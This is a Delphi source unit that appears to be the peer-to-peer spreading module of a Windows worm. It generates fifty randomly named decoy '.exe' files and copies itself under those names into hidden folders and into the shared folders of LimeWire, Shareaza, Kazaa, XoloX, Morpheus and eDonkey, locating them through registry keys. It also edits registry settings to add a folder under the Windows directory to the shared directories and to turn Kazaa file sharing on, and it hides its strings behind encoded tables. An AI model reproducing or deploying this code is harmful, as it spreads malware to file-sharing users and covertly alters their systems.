UNIT P2P;

INTERFACE

USES
  Registry, Utils, MainStrings;

PROCEDURE InitPeerToPeer;
PROCEDURE SetWinPath;

VAR
  Reg     : TRegistry;
  WinPath : STRING;

IMPLEMENTATION

VAR
  Fake              : ARRAY [1..50] OF STRING;
  FakeFiles         : XArray;
  Addon             : XArray;
  NumberOfFakeFiles : WORD;
  NumberOfAddon     : WORD;
  SysConfigDir      : STRING;

{$I Resources\TFAKEFILES.INI}
{$I Resources\TADDON.INI}

PROCEDURE RandomFileName;
VAR
  S      : STRING;
  I      : BYTE;
  J      : BYTE;
  Double : BOOL;
BEGIN
  I:=0;
  REPEAT
    Double:=False;
    S:=FakeFiles[Random(NumberOfFakeFiles-1)+1]+' '+Addon[Random(NumberOfAddon-1)+1]+MainStr[28]; //".exe"
    FOR J:=1 TO I+1 DO IF S=Fake[J] THEN Double:=True;

    IF NOT Double THEN BEGIN
      Inc(I);
      Fake[I]:=S;
    END;
  UNTIL I=50;
END;

PROCEDURE SetWinPath;
VAR
  PWindowsDir : ARRAY [0..255] OF Char;
BEGIN
  GetWindowsDirectory(PWindowsDir,255);
  WinPath:=STRING(PWindowsDir)+'\';
END;

PROCEDURE MakeFakeFiles(SharedDir:STRING);
VAR
  I : WORD;
BEGIN
  If SharedDir<>'' THEN BEGIN
    RandomFileName;
    CreateDir(SharedDir,0);
    SetFileAttributes(pChar(SharedDir),FILE_ATTRIBUTE_HIDDEN);
    FOR I:=1 TO 50 DO CopyFiles(False,SharedDir+'\'+Fake[I]);
  END;
END;

////////////////////////////////\EDONKEY/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

FUNCTION FindEDonkey : BOOL;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  RESULT:=Reg.KeyExists(Software+MainStr[6]);                                   //"ed2k"
  Reg.CloseKey;
END;

FUNCTION EDonkeyShare : STRING;
VAR
  I : WORD;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(SoftwareMic+MainStr[7],False);                                    //"Windows\CurrentVersion\Uninstall\eDonkey2000"
  RESULT:=Reg.ReadString(MainStr[8]);                                           //"UninstallString"
  I:=Pos(MainStr[50],RESULT);                                                   //"uninstall"
  IF I>0 THEN BEGIN
    Delete(RESULT,I-1,Length(RESULT));
    Delete(RESULT,1,1);
//    RESULT:=Copy(RESULT,2,I-1);
    RESULT:=RESULT+MainStr[9];                                                  //"incoming"
  END;
  Reg.CloseKey;
END;

/////////////////////////////////\MORPHEUS/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

FUNCTION FindMorpheus : BOOL;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  RESULT:=Reg.KeyExists(Software+MainStr[10]);                                  //"Morpheus"
  Reg.CloseKey;
END;

FUNCTION MorpheusShare : STRING;
VAR
  I : WORD;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(SoftwareMic+MainStr[11],False);                                   //"Windows\CurrentVersion\Uninstall\Morpheus 2.0"
  RESULT:=Reg.ReadString(MainStr[8]);                                           //"UninstallString"
  I:=Pos(MainStr[51],RESULT);                                                   //"UNWISE.EXE"
  IF I>0 THEN BEGIN
    Delete(RESULT,I-1,Length(RESULT));
    RESULT:=RESULT+MainStr[12];                                                 //"\My Shared Folder"
  END;
  Reg.CloseKey;
END;

//////////////////////////////////\XOLOX/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

FUNCTION FindXoloX : BOOL;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  RESULT:=Reg.KeyExists(Software+MainStr[13]);                                  //"Xolox"
  Reg.CloseKey;
END;

FUNCTION XoloxShare : STRING;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  Reg.OpenKey(Software+MainStr[13],False);                                      //"Xolox"
  RESULT:=Reg.ReadString(MainStr[14]);                                          //"shareddirs"
  IF Pos(WinPath+SysConfigDir,RESULT)=0 THEN Reg.WriteString(MainStr[14],RESULT+'|'+WinPath+SysConfigDir+'\'); //"shareddirs"
  Reg.CloseKey;
  RESULT:=WinPath+SysConfigDir;
END;

///////////////////////////////////\KAZAA/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

FUNCTION FindKazaa : BOOL;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  RESULT:=Reg.KeyExists(Software+MainStr[15]);                                  //"Kazaa"
  Reg.CloseKey;
END;

FUNCTION KazaaShare : STRING;
VAR
  Dir : STRING;
  I   : WORD;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  Reg.OpenKey(Software+MainStr[16],True);                                       //"Kazaa\LocalContent"
  I:=0;
  REPEAT
    Str(I,Dir);
    Dir:=MainStr[55]+Dir;                                                       //"Dir"
    Inc(I);
    RESULT:=Reg.ReadString(Dir);
  UNTIL (RESULT='')or(Pos(SysConfigDir,RESULT)>0);
  IF RESULT='' THEN Reg.WriteString(Dir,MainStr[17]+WinPath+SysConfigDir);           // <- Create Dir to Fake Files   //"012345:"
  Reg.WriteInteger(MainStr[18],0);                                              // <- Enable File Sharing        //"DisableSharing"
  Reg.CloseKey;
  RESULT:=WinPath+SysConfigDir;
END;

/////////////////////////////////\SHAREAZA/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

FUNCTION FindShareaza : BOOL;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  RESULT:=Reg.KeyExists(Software+MainStr[19]);                                  //"Shareaza"
  Reg.CloseKey;
END;

FUNCTION ShareazaShare : STRING;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  Reg.OpenKey(Software+MainStr[20],False);                                      //"Shareaza\Shareaza\Transfers"
  RESULT:=Reg.ReadString(MainStr[21]);                                          //"DownloadsPath"
  Reg.CloseKey;
END;

/////////////////////////////////\LIMEWIRE/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

FUNCTION FindLimeWire : BOOL;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  RESULT:=Reg.KeyExists(Software+MainStr[22]);                                  //"LimeWire"
  Reg.CloseKey;
END;

FUNCTION LimeWireShare : STRING;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(Software+MainStr[22],False);                                      //"LimeWire"
  RESULT:=Reg.ReadString(MainStr[24])+MainStr[25];                              //"InstallDir","\Shared"
  Reg.CloseKey;
END;

///////////////////////////////////\INIT/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

PROCEDURE InitPeerToPeer;
BEGIN
  SysConfigDir:=MainStr[56];                                                    //"Drivers"
  NumberOfFakeFiles:=DecodeStrings(TFakeFiles,FakeFiles);
  NumberOfAddon:=DecodeStrings(TAddon,Addon);
  Randomize;
  Reg:=TRegistry.Create;
  MakeFakeFiles(MainStr[26]);                                                   //"C:\My Downloads"
  IF FindLimeWire THEN MakeFakeFiles(LimeWireShare);
  IF FindShareaza THEN MakeFakeFiles(ShareazaShare);
  IF FindKazaa THEN MakeFakeFiles(KazaaShare);
  IF FindXolox THEN MakeFakeFiles(XoloXShare);
  IF FindMorpheus THEN MakeFakeFiles(MorpheusShare);
  IF FindEdonkey THEN MakeFakeFiles(EdonkeyShare);
  Reg.Free;
END;

END.
